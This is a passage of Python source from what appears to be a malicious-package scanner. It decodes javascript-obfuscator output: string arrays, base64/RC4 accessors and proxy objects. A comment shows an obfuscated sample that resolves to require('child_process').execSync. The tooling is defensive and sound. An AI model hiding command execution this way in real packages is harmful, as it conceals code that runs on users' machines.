                         + r")*\)){1,400})\)")
_SA_FUNCTION_TAIL_RE = re.compile(r"function\s*$")
_SA_DECIMAL_RE = re.compile(r"[+-]?(?:\d+\.?\d*(?:[eE][+-]?\d+)?|\.\d+(?:[eE][+-]?\d+)?)")
_SA_HEX = frozenset("0123456789abcdefABCDEF")
_SA_ESCAPES = {"n": "\n", "r": "\r", "t": "\t", "b": "\b", "f": "\f", "v": "\v"}
# JavaScript's white space and line terminators (what parseInt and Number skip)
_SA_JS_SPACE = frozenset("\t\n\v\f\r \u00a0\u1680\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009"
                         "\u200a\u2028\u2029\u202f\u205f\u3000\ufeff")


class _SaStop(Exception):
    """What the string-array reader cannot read: nothing is decoded there."""


def _sa_string(body):
    """The value of a JavaScript string literal's body (between its quotes),
    else None (a malformed escape)."""
    if "\\" not in body:
        return body
    out, i, n = [], 0, len(body)
    while i < n:
        ch = body[i]
        if ch != "\\":
            out.append(ch)
            i += 1
            continue
        if i + 1 >= n:
            return None
        e = body[i + 1]
        if e == "x":
            h = body[i + 2:i + 4]
            if len(h) != 2 or not set(h) <= _SA_HEX:
                return None
            out.append(chr(int(h, 16)))
            i += 4
        elif e == "u":
            if body[i + 2:i + 3] == "{":
                k = body.find("}", i + 3)
                h = body[i + 3:k] if k > 0 else ""
                if not h or len(h) > 6 or not set(h) <= _SA_HEX or int(h, 16) > 0x10FFFF:
                    return None
                out.append(chr(int(h, 16)))
                i = k + 1
            else:
                h = body[i + 2:i + 6]
                if len(h) != 4 or not set(h) <= _SA_HEX:
                    return None
                out.append(chr(int(h, 16)))
                i += 6
        elif e in _SA_ESCAPES:
            out.append(_SA_ESCAPES[e])
            i += 2
        elif "0" <= e <= "7":
            m = _SA_OCT_RE.match(body, i + 1)
            out.append(chr(int(m.group(), 8)))
            i = m.end()
        else:
            out.append(e)
            i += 2
    return "".join(out)


def _sa_strings(text, i):
    """(values, end) of the string literals of the array literal whose '['
    ends at text[i], at most _SA_MAX_ITEMS; None when an item is not one."""
    items, n = [], len(text)
    while True:
        i = _SA_SPACE_RE.match(text, i).end()
        if i >= n:
            return None
        if text[i] == "]" and not items:
            return items, i + 1
        m = _SA_LIT_RE.match(text, i)
        if m is None or len(items) >= _SA_MAX_ITEMS:
            return None
        v = _sa_string(m.group()[1:-1])
        if v is None:
            return None
        items.append(v)
        i = _SA_SPACE_RE.match(text, m.end()).end()
        if i < n and text[i] == ",":
            i += 1
            continue
        if i < n and text[i] == "]":
            return items, i + 1
        return None


def _sa_number(s):
    """A number literal's value (hex, or decimal), NaN past _SA_HEX_MAX hex digits."""
    if s[:2] in ("0x", "0X"):
        return float(int(s[2:], 16)) if len(s) - 2 <= _SA_HEX_MAX else math.nan
    return float(s)


def _sa_to_number(v):
    """JavaScript's ToNumber of a number or a string (StringToNumber:
    white space trimmed, "" 0, hex 0x…, binary 0b…, octal 0o…, decimal,
    Infinity, else NaN)."""
    if isinstance(v, float):
        return v
    i, j = 0, len(v)
    while i < j and v[i] in _SA_JS_SPACE:
        i += 1
    while j > i and v[j - 1] in _SA_JS_SPACE:
        j -= 1
    s = v[i:j]
    if not s:
        return 0.0
    if s[:2] in ("0x", "0X", "0b", "0B", "0o", "0O") and len(s) > 2:
        digits = {"x": _SA_HEX, "b": frozenset("01"), "o": frozenset("01234567")}[s[1].lower()]
        if not set(s[2:]) <= digits or len(s) - 2 > _SA_HEX_MAX:
            return math.nan
        return float(int(s[2:], {"x": 16, "b": 2, "o": 8}[s[1].lower()]))
    if s in ("Infinity", "+Infinity"):
        return math.inf
    if s == "-Infinity":
        return -math.inf
    if s.isascii() and _SA_DECIMAL_RE.fullmatch(s) is not None:
        return float(s)
    return math.nan


def _sa_to_string(v):
    """JavaScript's ToString of a string, or of a number that is an integer
    under 1e21 (other numbers are not read)."""
    if isinstance(v, str):
        return v
    if v == v and abs(v) < 1e21 and v == int(v):
        return str(int(v))
    raise _SaStop("number text")


def _sa_div(a, b):
    """a / b as JavaScript divides doubles."""
    if b == 0:
        if a == 0 or a != a:
            return math.nan
        return math.copysign(math.inf, a) * math.copysign(1.0, b)
    return a / b


def _sa_parse_int(v):
    """JavaScript's parseInt(v) for a string (radix 10, or 16 after 0x),
    NaN for anything else and past _SA_DEC_MAX digits (_SA_HEX_MAX hex)."""
    if not isinstance(v, str):
        return math.nan
    i, n = 0, len(v)
    while i < n and v[i] in _SA_JS_SPACE:
        i += 1
    sign = 1.0
    if i < n and v[i] in "+-":
        sign = -1.0 if v[i] == "-" else 1.0
        i += 1
    radix = 10
    if v[i:i + 2] in ("0x", "0X"):
        radix, i = 16, i + 2
    j = i
    while j < n and ("0" <= v[j] <= "9" or radix == 16 and v[j] in _SA_HEX):
        j += 1
    if j == i or j - i > (_SA_HEX_MAX if radix == 16 else _SA_DEC_MAX):
        return math.nan
    return sign * float(int(v[i:j], radix))


def _sa_tokens(src):
    """The tokens of an expression: ('n', number) ('s', string) ('i', name) ('o', operator)."""
    out, i, n = [], 0, len(src)
    while i < n:
        m = _SA_TOKEN_RE.match(src, i)
        if m is None or m.end() == i:
            if src[i:].strip() == "":
                break
            raise _SaStop("token")
        if m.group("num") is not None:
            out.append(("n", _sa_number(m.group("num"))))
        elif m.group("str") is not None:
            v = _sa_string(m.group("str")[1:-1])
            if v is None:
                raise _SaStop("string")
            out.append(("s", v))
        elif m.group("name") is not None:
            out.append(("i", m.group("name")))
        else:
            out.append(("o", m.group("op")))
        i = m.end()
    return out


def _sa_parse(toks, consts, many=False):
    """The tree of an expression (a list of them, comma-separated: `many`):
    ('n', v) ('s', v) ('var', name) ('neg', x) ('pos', x) (op, a, b)
    ('call', name, [args]) ('pi', name, [args]) — a constant of an object
    of constants (NAME.key, NAME['key']) read as its value."""
    pos = [0]

    def peek():
        return toks[pos[0]] if pos[0] < len(toks) else None

    def take(want=None):
        t = peek()
        if t is None or (want is not None and t != want):
            raise _SaStop("syntax")
        pos[0] += 1
        return t

    def const(name, key):
        table = consts.get(name)
        if table is None or key not in table:
            raise _SaStop("constant")
        return table[key]

    def primary():
        t = take()
        if t[0] in ("n", "s"):
            return t
        if t == ("o", "("):
            v = additive()
            take(("o", ")"))
            return v
        if t[0] != "i":
            raise _SaStop("primary")
        nxt = peek()
        if nxt == ("o", "."):
            take()
            key = take()
            if key[0] != "i":
                raise _SaStop("key")
            return const(t[1], key[1])
        if nxt == ("o", "["):
            take()
            key = take()
            take(("o", "]"))
            if key[0] != "s":
                raise _SaStop("key")
            return const(t[1], key[1])
        if nxt == ("o", "("):
            take()
            args = []
            if peek() != ("o", ")"):
                while True:
                    args.append(additive())
                    if peek() != ("o", ","):
                        break
                    take()
            take(("o", ")"))
            if t[1] == "parseInt":
                if len(args) != 1 or args[0][0] != "call":
                    raise _SaStop("parseInt")
                return ("pi", args[0][1], args[0][2])
            return ("call", t[1], args)
        return ("var", t[1])

    def unary():
        t = peek()
        if t == ("o", "-"):
            take()
            return ("neg", unary())
        if t == ("o", "+"):
            take()
            return ("pos", unary())
        return primary()

    def mult():
        v = unary()
        while peek() in (("o", "*"), ("o", "/")):
            v = (take()[1], v, unary())
        return v

    def additive():
        v = mult()
        while peek() in (("o", "+"), ("o", "-")):
            v = (take()[1], v, mult())
        return v

    if many:
        out = []
        if toks:
            while True:
                out.append(additive())
                if peek() != ("o", ","):
                    break
                take()
    else:
        out = additive()
    if pos[0] != len(toks):
        raise _SaStop("rest")
    return out


def _sa_value(tree, env, call):
    """The JavaScript value (a float or a str) of a tree: `env` gives names
    their values, `call(name, args)` a call's."""
    k = tree[0]
    if k in ("n", "s"):
        return tree[1]
    if k == "var":
        if tree[1] not in env:
            raise _SaStop("free name")
        return env[tree[1]]
    if k == "neg":
        return -_sa_to_number(_sa_value(tree[1], env, call))
    if k == "pos":
        return _sa_to_number(_sa_value(tree[1], env, call))
    if k == "+":
        a, b = _sa_value(tree[1], env, call), _sa_value(tree[2], env, call)
        if isinstance(a, str) or isinstance(b, str):
            return _sa_to_string(a) + _sa_to_string(b)
        return a + b
    if k in ("-", "*", "/"):
        a = _sa_to_number(_sa_value(tree[1], env, call))
        b = _sa_to_number(_sa_value(tree[2], env, call))
        return a - b if k == "-" else a * b if k == "*" else _sa_div(a, b)
    if call is None:
        raise _SaStop("call")
    got = call(tree[1], [_sa_value(a, env, call) for a in tree[2]])
    return _sa_parse_int(got) if k == "pi" else got


def _sa_atob(s, alphabet):
    """The accessor's base64 (its own alphabet, as its loop reads it: a
    character outside the alphabet skipped) read as UTF-8, as its
    decodeURIComponent does; None where that throws or holds a character
    past U+FFFF."""
    out, bc, bs = bytearray(), 0, 0
    for ch in s:
        v = alphabet.find(ch)
        if v < 0:
            continue
        bs = bs * 64 + v if bc % 4 else v
        bc += 1
        if (bc - 1) % 4:
            out.append(255 & (bs >> ((-2 * bc) & 6)))
    try:
        text = out.decode("utf-8")
    except UnicodeDecodeError:
        return None
    return None if any(ord(ch) > 0xFFFF for ch in text) else text


def _sa_rc4(s, key, alphabet):
    """The accessor's RC4 with `key` over its base64 (_sa_atob), else None."""
    data = _sa_atob(s, alphabet)
    if data is None or not isinstance(key, str) or not key or any(
            0xD800 <= ord(ch) <= 0xDFFF or ord(ch) > 0xFFFF for ch in key):
        return None
    box, j = list(range(256)), 0
    for i in range(256):
        j = (j + box[i] + ord(key[i % len(key)])) % 256
        box[i], box[j] = box[j], box[i]
    i = j = 0
    out = []
    for ch in data:
        i = (i + 1) % 256
        j = (j + box[i]) % 256
        box[i], box[j] = box[j], box[i]
        out.append(chr(ord(ch) ^ box[(box[i] + box[j]) % 256]))
    text = "".join(out)
    return None if any(0xD800 <= ord(ch) <= 0xDFFF for ch in text) else text


def _sa_consts(text):
    """{name: {key: ('n', v) | ('s', v)}}: the objects of number and string
    constants `text` assigns (a name assigned two is none of them)."""
    out = {}
    for m in _SA_OBJECT_RE.finditer(text):
        i, table = m.end(), {}
        while True:
            e = _SA_ENTRY_RE.match(text, i)
            if e is None:
                table = None
                break
            key = e.group("k") or e.group("k2") or e.group("k3") or ""
            v = e.group("v")
            if v[0] in "'\"":
                val = _sa_string(v[1:-1])
                if val is None:
                    table = None
                    break
                table[key] = ("s", val)
            else:
                neg = v.startswith("-")
                num = _sa_number(v.lstrip("-").strip())
                table[key] = ("n", -num if neg else num)
            i = e.end()
            if e.group("end") == "}":
                break
        if table:
            name = m.group(1)
            out[name] = None if name in out else table
    return {k: v for k, v in out.items() if v is not None}


class _SaAccessor:
    """A string array's accessor: its strings, offset and alphabet, and the
    decoding and rotation the checksum gave."""
    __slots__ = ("fn", "items", "off", "alphabet", "kind", "rot", "memo")

    def __init__(self, fn, items, off, alphabet):
        self.fn, self.items, self.off, self.alphabet = fn, items, off, alphabet
        self.kind, self.rot, self.memo = "plain", 0, {}

    def read(self, idx, key, kind=None, rot=None):
        """The string a call with index `idx` (and `key`) returns, else None."""
        if idx is None:
            return None
        kind = self.kind if kind is None else kind
        rot = self.rot if rot is None else rot
        n = len(self.items)
        i = _sa_to_number(idx) - self.off
        if i != i or not 0 <= i < n or i != int(i):
            return None
        k = (int(i) + rot) % n
        got = self.memo.get((k, key, kind), self)
        if got is self:
            s = self.items[k]
            got = (s if kind == "plain" else _sa_atob(s, self.alphabet) if kind == "base64"
                   else _sa_rc4(s, key, self.alphabet))
            self.memo[(k, key, kind)] = got
        return got


def _sa_quote(s):
    """A single-quoted literal of `s` on one row."""
    return "'" + (s.replace("\\", "\\\\").replace("'", "\\'").replace("\n", "\\n").replace("\r", "\\r")
                  .replace("\u2028", "\\u2028").replace("\u2029", "\\u2029")) + "'"


def _dv_string_arrays(text):
    """`text` with the calls that read a string array (see above) read as
    their strings; `text` itself when it has none."""
    return _sa_read(text)[0]


def _sa_read(text):
    """(_dv_string_arrays' reading of `text`, the offset of the first string
    array whose calls it read, else None)."""
    if len(text) > _SA_MAX_CHARS or "function" not in text:
        return text, None
    arrays, starts = [], {}
    for m in _SA_ARRAY_FN_RE.finditer(text):
        got = _sa_strings(text, m.end())
        if got is None or not got[0]:
            continue
        fn, arr = re.escape(m.group("fn")), re.escape(m.group("arr"))
        tail = re.compile(_SA_TAIL_HEAD + fn + _SA_TAIL_MID + arr + _SA_TAIL_END + fn + _SA_TAIL_CALL)
        if tail.match(text, got[1]) is None:
            continue
        arrays.append((m.group("fn"), got[0]))
        starts.setdefault(m.group("fn"), m.start())
        if len(arrays) >= _SA_MAX_ARRAYS:
            break
    if not arrays:
        return text, None
    consts = _sa_consts(text)
    accessors = {}
    for fn, items in arrays:
        esc = re.escape(fn)
        for rx in (re.compile(_SA_ACC_A_HEAD + esc + _SA_CALL_TAIL), re.compile(_SA_ACC_B_HEAD + esc + _SA_ACC_B_TAIL)):
            for m in rx.finditer(text):
                try:
                    off = _sa_to_number(_sa_value(_sa_parse(_sa_tokens(m.group("off")), consts), {}, None))
                except _SaStop:
                    continue
                if off != off or abs(off) == math.inf or off != int(off):
                    continue
                a = _SA_ALPHABET_RE.search(text, m.end(), m.end() + _SA_BODY)
                accessors[m.group("g")] = _SaAccessor(fn, items, int(off), a.group(1) if a else None)
    if not accessors:
        return text, None
    aliases, wrappers = {}, {}                      # name -> {names it is given}; name -> [(params, target, args)]
    for m in _SA_ALIAS_RE.finditer(text):
        aliases.setdefault(m.group(1), set()).add(m.group(2))
    for m in _SA_WRAPPER_RE.finditer(text):
        params = [p.group(1) for p in (_SA_PARAM_RE.fullmatch(x) for x in m.group("params").split(","))
                  if p is not None] if m.group("params").strip() else []
        try:
            if len(params) != (len(m.group("params").split(",")) if m.group("params").strip() else 0):
                raise _SaStop("parameters")
            args = _sa_parse(_sa_tokens(m.group("args")), consts, many=True)
        except _SaStop:
            continue
        wrappers.setdefault(m.group("n1") or m.group("n2"), []).append((params, m.group("target"), args))

    def resolve(name, args, depth=0):
        """(accessor, index, key) a call of `name` with `args` reads."""
        if depth > _SA_DEPTH:
            raise _SaStop("deep")
        acc = accessors.get(name)
        if acc is not None:
            return acc, (args[0] if args else None), (args[1] if len(args) > 1 else None)
        given, wraps = aliases.get(name, ()), wrappers.get(name, ())
        if len(given) + len(wraps) != 1:
            raise _SaStop("not one")
        if given:
            return resolve(next(iter(given)), args, depth + 1)
        params, target, targs = wraps[0]
        if len(args) < len(params):
            raise _SaStop("arity")
        env = dict(zip(params, args))
        return resolve(target, [_sa_value(a, env, None) for a in targs], depth + 1)

    for name, acc in list(accessors.items()):
        fn = re.escape(acc.fn)
        inv = (re.compile(_SA_INVOKE_HEAD + fn + _SA_INVOKE_TAIL).search(text)
               or re.compile(_SA_INVOKE2_HEAD + fn + _SA_INVOKE2_TAIL).search(text))
        if inv is None:
            acc.kind = "base64" if acc.alphabet else "plain"
            continue
        loop = None
        for loop in _SA_CHECKSUM_RE.finditer(text, max(0, inv.start() - _SA_LOOP_BACK), inv.start()):
            pass
        try:
            if loop is None:
                raise _SaStop("no checksum")
            target = _sa_to_number(_sa_value(_sa_parse(_sa_tokens(inv.group("t")), consts), {}, None))
            tree = _sa_parse(_sa_tokens(loop.group("e")), consts)
            terms = []                               # (term, index, key): the parseInt calls, resolved once

            def collect(t):
                if t[0] == "pi":
                    got = resolve(t[1], [_sa_value(a, {}, None) for a in t[2]])
                    if got[0] is not acc:
                        raise _SaStop("another accessor")
                    terms.append((t, got[1], got[2]))
                elif t[0] in ("neg", "pos"):
                    collect(t[1])
                elif t[0] in ("+", "-", "*", "/"):
                    collect(t[1])
                    collect(t[2])
                elif t[0] != "n":
                    raise _SaStop("term")
            collect(tree)
        except _SaStop:
            del accessors[name]
            continue
        chosen = None
        for kind in (("plain", "base64", "rc4") if acc.alphabet else ("plain",)):
            for rot in range(len(acc.items)):
                vals = {}
                for t, idx, key in terms:           # (a term that is NaN makes the checksum NaN)
                    v = _sa_parse_int(acc.read(idx, key, kind, rot))
                    if v != v:
                        break
                    vals[id(t)] = v
                if len(vals) < len(terms):
                    continue

                def num(t):
                    k = t[0]
                    if k == "n":
                        return t[1]
                    if k == "pi":
                        return vals[id(t)]
                    if k == "neg":
                        return -num(t[1])
                    if k == "pos":
                        return num(t[1])
                    a, b = num(t[1]), num(t[2])
                    return a + b if k == "+" else a - b if k == "-" else a * b if k == "*" else _sa_div(a, b)
                if num(tree) == target:
                    chosen = (kind, rot)
                    break
            if chosen is not None:
                break
        if chosen is None:
            del accessors[name]
        else:
            acc.kind, acc.rot = chosen
    if not accessors:
        return text, None
    callers, queue, given_to = set(accessors), list(accessors), {}   # every name that reaches an accessor
    for name, given in aliases.items():
        if len(given) == 1 and name not in wrappers:
            given_to.setdefault(next(iter(given)), []).append(name)
    for name, wraps in wrappers.items():
        if len(wraps) == 1 and name not in aliases:
            given_to.setdefault(wraps[0][1], []).append(name)
    while queue:
        for name in given_to.get(queue.pop(), ()):
            if name not in callers:
                callers.add(name)
                queue.append(name)
    out, pos, read, first = [], 0, 0, None
    while read < _SA_MAX_CALLS:
        m = _SA_CALL_RE.search(text, pos)
        if m is None:
            break
        s = None
        if m.group(1) in callers and _SA_FUNCTION_TAIL_RE.search(text, max(0, m.start() - 9), m.start()) is None:
            try:
                args = [_sa_value(a, {}, None) for a in _sa_parse(_sa_tokens(m.group(2)), consts, many=True)]
                acc, idx, key = resolve(m.group(1), args)
                s = acc.read(idx, key)
            except _SaStop:
                pass
        if s is None:                               # (the calls in its arguments are read on)
            out.append(text[pos:m.end(1)])
            pos = m.end(1)
            continue
        out.append(text[pos:m.start()])
        out.append(_sa_quote(s))
        pos = m.end()
        read += 1
        first = starts[acc.fn] if first is None else min(first, starts[acc.fn])
    if not read:
        return text, None
    out.append(text[pos:])
    return "".join(out), first


# (0.1.8) Proxy objects. javascript-obfuscator's control-flow flattening
# moves calls, operators and strings into objects of functions and read
# back through them:
#     const o = {'oEnxQ': function (f, a) { return f(a); },
#                'rqVFD': function (a, b) { return a >= b; }, 'OKaPt': 'child_proc' + 'ess'};
#     o['oEnxQ'](require, o['OKaPt'])['execSync'](…)
# which is require('child_process').execSync(…). An object whose every
# entry is such a function (it calls its first parameter with the others,
# applies an operator to its two parameters, or hands its parameters to
# another such entry), a string (literals joined with +) or another such
# object's entry, is read as what it stands for: a call of an entry read
# as the call or the operation it makes (its arguments read the same way),
# a string entry as its literal. A name given several objects (an
# obfuscator reuses a short name in each function) is read at each use as
# the object it was last given before it, and not where that one is no
# proxy. At most _PX_MAX_ENTRIES entries an object, _PX_MAX_USES uses
# read, calls nested _PX_DEPTH deep.
_PX_MAX_ENTRIES = 256
_PX_MAX_USES = 1_000_000
_PX_DEPTH = 32
_PX_ARGS = 4000                 # characters of a call's arguments read, at most
_PX_OBJECT_RE = re.compile(r"(?<![\w$.])(" + _SA_IDENT + r")\s*=\s*\{")
_PX_KEY_RE = re.compile(r"""\s*(?:(?P<k>""" + _SA_IDENT + r""")|'(?P<k2>[^'\\\n]*)'|"(?P<k3>[^"\\\n]*)")\s*:\s*""")
_PX_FUNCTION_RE = re.compile(r"function\s*(?:" + _SA_IDENT + r"\s*)?\((?P<params>[^()]{0,400})\)\s*\{"
                             r"(?:\s*(?:var|const|let)\s+" + _SA_IDENT + r"\s*=\s*" + _SA_IDENT + r"\s*;)*"
                             r"\s*return\s+(?P<e>[^;{}]{1,400}?)\s*;?\s*\}")
_PX_BINARY_RE = re.compile(r"\s*(" + _SA_IDENT + r")(?:\s*(===|!==|==|!=|<=|>=|<<|>>>|>>|&&|\|\||\*\*|[-+*/%<>&|^])\s*"
                           r"|\s+(instanceof|in)\s+)(" + _SA_IDENT + r")\s*")
_PX_CALL_RE = re.compile(r"\s*(" + _SA_IDENT + r")\s*\((?P<a>[^()]*)\)\s*")
_PX_REF_CALL_RE = re.compile(r"""\s*(?P<o>""" + _SA_IDENT + r""")\s*\[\s*(?:'(?P<k>[^'\\\n]*)'|"(?P<k2>[^"\\\n]*)")\s*\]"""
                             r"""\s*\((?P<a>[^()]*)\)\s*""")
_PX_REF_RE = re.compile(r"""(?P<o>""" + _SA_IDENT + r""")\s*\[\s*(?:'(?P<k>[^'\\\n]*)'|"(?P<k2>[^"\\\n]*)")\s*\]""")
_PX_STRINGS_RE = re.compile(r"""(?:'(?:[^'\\\n]|\\[^\n])*'|"(?:[^"\\\n]|\\[^\n])*")"""
                            r"""(?:\s*\+\s*(?:'(?:[^'\\\n]|\\[^\n])*'|"(?:[^"\\\n]|\\[^\n])*"))*""")
_PX_END_RE = re.compile(r"\s*([,}])")
_PX_USE_RE = re.compile(r"""(?<![\w$.])(""" + _SA_IDENT + r""")\s*\[\s*(?:'([^'\\\n]*)'|"([^"\\\n]*)")\s*\]""")
_PX_OPEN_RE = re.compile(r"\s*\(")


def _px_params(src):
    """The parameter names of a parameter list, else None."""
    if not src.strip():
        return []
    names = [_SA_PARAM_RE.fullmatch(p) for p in src.split(",")]
    return None if any(n is None for n in names) else [n.group(1) for n in names]


def _px_entries(text, i):
    """{key: entry} of the object literal whose '{' ends at text[i] when
    every entry is a proxy (see above), else None. An entry: ('call', n)
    calls its first parameter with the n others; ('op', op); ('str', s);
    ('ref', object, key); ('refcall', object, key, n)."""
    out = {}
    while True:
        k = _PX_KEY_RE.match(text, i)
        if k is None or len(out) >= _PX_MAX_ENTRIES:
            return None
        key = k.group("k") or k.group("k2") or k.group("k3") or ""
        i = k.end()
        f = _PX_FUNCTION_RE.match(text, i)
        s = _PX_STRINGS_RE.match(text, i) if f is None else None
        r = _PX_REF_RE.match(text, i) if f is None and s is None else None
        if f is not None:
            params, body = _px_params(f.group("params")), f.group("e")
            if params is None or len(set(params)) != len(params):
                return None
            b = _PX_BINARY_RE.fullmatch(body)
            c = _PX_CALL_RE.fullmatch(body)
            rc = _PX_REF_CALL_RE.fullmatch(body)
            if b is not None and len(params) == 2 and [b.group(1), b.group(4)] == params:
                entry = ("op", b.group(2) or b.group(3))
            elif c is not None and params and c.group(1) == params[0] and _px_params(c.group("a")) == params[1:]:
                entry = ("call", len(params) - 1)
            elif rc is not None and _px_params(rc.group("a")) == params:
                entry = ("refcall", rc.group("o"), rc.group("k") if rc.group("k") is not None else rc.group("k2"),
                         len(params))
            else:
                return None
            i = f.end()
        elif s is not None:
            parts = [_sa_string(x.group()[1:-1]) for x in _SA_LIT_RE.finditer(s.group())]
            if any(p is None for p in parts):
                return None
            entry = ("str", "".join(parts))
            i = s.end()
        elif r is not None:
            entry = ("ref", r.group("o"), r.group("k") if r.group("k") is not None else r.group("k2"))
            i = r.end()
        else:
            return None
        out[key] = entry
        e = _PX_END_RE.match(text, i)
        if e is None:
            return None
        i = e.end()
        if e.group(1) == "}":
            return out


def _px_args(text, i, hi):
    """(end, [(start, end)]) of the arguments of the call whose '(' ends at
    text[i]: the ')' that closes it (quote-aware, within _PX_ARGS
    characters and `hi`) and its top-level arguments; None when it does not close."""
    parts, depth, start, j, quote = [], 0, i, i, None
    end = min(hi, i + _PX_ARGS)
    while j < end:
        ch = text[j]
        if quote is not None:
            if ch == "\\":
                j += 2
                continue
            if ch == quote:
                quote = None
        elif ch in "'\"`":
            quote = ch
        elif ch in "([{":
            depth += 1
        elif ch in ")]}":
            if depth == 0:
                if ch != ")":
                    return None
                if text[start:j].strip() or parts:
                    parts.append((start, j))
                return j, parts
            depth -= 1
        elif ch == "," and depth == 0:
            parts.append((start, j))
            start = j + 1
        j += 1
    return None


def _dv_proxies(text):
    """`text` with the proxy objects' uses (see above) read as what they
    stand for; `text` itself when it has none."""
    if "function" not in text or "[" not in text:
        return text
    found = {}                                      # name -> [(start, entries or None)], in order
    for m in _PX_OBJECT_RE.finditer(text):
        found.setdefault(m.group(1), []).append((m.start(), _px_entries(text, m.end())))
    objects = {k: v for k, v in found.items() if any(e for _, e in v)}
    if not objects:
        return text
    starts = {k: [a for a, _ in v] for k, v in objects.items()}

    def lookup(name, pos):
        """The entries of the object `name` was last given before pos (a
        name an obfuscator reuses in each function holds that function's
        object), else {}."""
        k = bisect.bisect_left(starts.get(name, ()), pos) - 1
        return (objects[name][k][1] or {}) if k >= 0 else {}

    def final(entry, pos, depth=0):
        """An entry with the entries it refers to followed: ('call', n) ('op', op) ('str', s), or None."""
        while entry is not None and entry[0] in ("ref", "refcall") and depth <= _PX_DEPTH:
            target = lookup(entry[1], pos).get(entry[2])
            if target is None:
                return None
            if entry[0] == "refcall":
                if target[0] == "str" or (target[0] == "call" and target[1] + 1 != entry[3]) \
                        or (target[0] == "op" and entry[3] != 2):
                    return None
            entry, depth = target, depth + 1
        return entry if entry is not None and entry[0] in ("call", "op", "str") else None

    uses = [0]

    def rewrite(lo, hi, depth):
        out, pos = [], lo
        while uses[0] < _PX_MAX_USES:
            m = _PX_USE_RE.search(text, pos, hi)
            if m is None:
                break
            entry = lookup(m.group(1), m.start()).get(m.group(2) if m.group(2) is not None else m.group(3))
            entry = final(entry, m.start()) if entry is not None else None
            if entry is None:
                out.append(text[pos:m.end()])
                pos = m.end()
                continue
            if entry[0] == "str":
                out.append(text[pos:m.start()])
                out.append(_sa_quote(entry[1]))
                pos = m.end()
                uses[0] += 1
                continue
            o = _PX_OPEN_RE.match(text, m.end(), hi)
            got = _px_args(text, o.end(), hi) if o is not None and depth < _PX_DEPTH else None
            want = entry[1] + 1 if entry[0] == "call" else 2
            if got is None or len(got[1]) != want:
                out.append(text[pos:m.end()])
                pos = m.end()
                continue
            args = [rewrite(a, b, depth + 1).strip() for a, b in got[1]]
            out.append(text[pos:m.start()])
            if entry[0] == "call":
                read = args[0] + "(" + ", ".join(args[1:]) + ")"
            else:
                read = "(" + args[0] + " " + entry[1] + " " + args[1] + ")"
            out.append(read)
            out.append("\n" * (text.count("\n", m.start(), got[0] + 1) - read.count("\n")))   # (rows kept)
            pos = got[0] + 1
            uses[0] += 1
        out.append(text[pos:hi])
        return "".join(out)

    return rewrite(0, len(text), 0)


_DV_MEMO = (None, None, None)          # the last text decoded_view read, its view, its string array's line


def _dv_reading(text):
    """(text, decoded_view's reading of it, the line of the string array it
    reads or None). The last text's is kept: the install-script test, the
    spawned-script follower and the import-time test read the same file."""
    global _DV_MEMO
    memo = _DV_MEMO
    if memo[0] is not text:
        memo = (text,) + _dv_read(text)
        _DV_MEMO = memo
    return memo


def decoded_view(text):
    """`text` read the way it reads once the strings it decodes as it runs
    are decoded (see above); `text` itself when there is nothing to decode."""
    return _dv_reading(text)[1]


def string_array_line(text):
    """The 1-based line of the string array `text` is built around — one
    whose calls decoded_view reads: javascript-obfuscator's technique (see
    _SA_TECHNIQUE_REASON) — else None."""
    return _dv_reading(text)[2]


def _dv_decoders(view):
    """`view` with the decoders' calls on literals read as their text (see
    above): Buffer.from, atob, Python's hex and base64, the file's own
    helpers and XOR decoders, character codes."""
    if "Buffer" in view:
        view = _DV_BUFFER_RE.sub(lambda m: (lambda d: m.group() if d is None else _dv_quote(d))(
            _dv_decode(m.group("enc"), _dv_literal(m))), view)
    if "atob" in view:
        view = _DV_ATOB_RE.sub(lambda m: (lambda d: m.group() if d is None else _dv_quote(d))(
            _dv_decode("base64", _dv_literal(m))), view)
    if "fromhex" in view or "unhexlify" in view or "b64decode" in view:
        view = _DV_PY_RE.sub(lambda m: (lambda d: m.group() if d is None else _dv_quote(d))(
            _dv_decode("hex" if (m.group("fh") or m.group("uh")) else "base64", _dv_literal(m))), view)
    helpers = _dv_helpers(view)
    if helpers:
        call = re.compile(_DV_NAME_HEAD + "(?P<name>" + "|".join(re.escape(n) for n in sorted(helpers))
                          + _DV_HELPER_CALL_TAIL)
        view = call.sub(lambda m: (lambda d: m.group() if d is None else _dv_quote(d))(
            _dv_decode(helpers[m.group("name")], _dv_literal(m))), view)
    if "^" in view:
        xors = _dv_xor_decoders(view)
        if xors:
            call = re.compile(_DV_NAME_HEAD + "(?P<name>" + "|".join(re.escape(n) for n in sorted(xors))
                              + _DV_HELPER_CALL_TAIL)
            view = call.sub(_dv_xor_sub(xors), view)
    if "fromCharCode" in view or "chr" in view or "byte" in view:
        view = _dv_char_codes(view)
    return view


# (the detection round) A string literal written wholly in \x and \u
# escapes, three or more (javascript-obfuscator's unicodeEscapeSequence:
# '\x63\x68\x69\x6c\x64…'), reads as its text when that is printable ASCII
# without a quote or a backslash: a proxy object's key, a member's name, a
# module's name read as written. Code that escapes a character or two
# ('\x20', "<\x2fscript>") is left as written, and so is a raw, bytes or
# f-string literal (a letter before its quote) and a quote a backslash
# escapes. Linear: an escape is one way to read its characters.
_DV_ESCAPED_LITERAL_RE = re.compile(r"""(?<![\w$\\])(['"])((?:\\x[0-9A-Fa-f]{2}|\\u[0-9A-Fa-f]{4}){3,})\1""")
_DV_ESCAPE_RE = re.compile(r"\\(?:x([0-9A-Fa-f]{2})|u([0-9A-Fa-f]{4}))")


def _dv_unescape_sub(m):
    s = _DV_ESCAPE_RE.sub(lambda e: chr(int(e.group(1) or e.group(2), 16)), m.group(2))
    if any(not " " <= ch <= "~" or ch in "'\"\\" for ch in s):
        return m.group()
    return m.group(1) + s + m.group(1)


def _dv_unescape(text):
    """`text` with its string literals written in escapes read as their
    text (see above)."""
    if "\\x" not in text and "\\u" not in text:
        return text
    return _DV_ESCAPED_LITERAL_RE.sub(_dv_unescape_sub, text)


def _decoded_view(text):
    """decoded_view's reading of a text."""
    return _dv_read(text)[0]


def _dv_read(text):
    """(decoded_view's reading of a text, the 1-based line of the string
    array it reads, else None)."""
    source = _dv_unescape(text)
    arrays, at = _sa_read(source)
    line = None if at is None else source.count("\n", 0, at) + 1     # (unescaping keeps the rows)
    base = _dv_proxies(arrays)
    if base == text:                                # (no string array or proxy object read)
        base = text
        if len(text) > _DV_MAX_CHARS or not any(n in text for n in _DV_NEEDLES):
            return text, None
    joined = view = _DV_JOIN_RE.sub("", base) if "+" in base else base
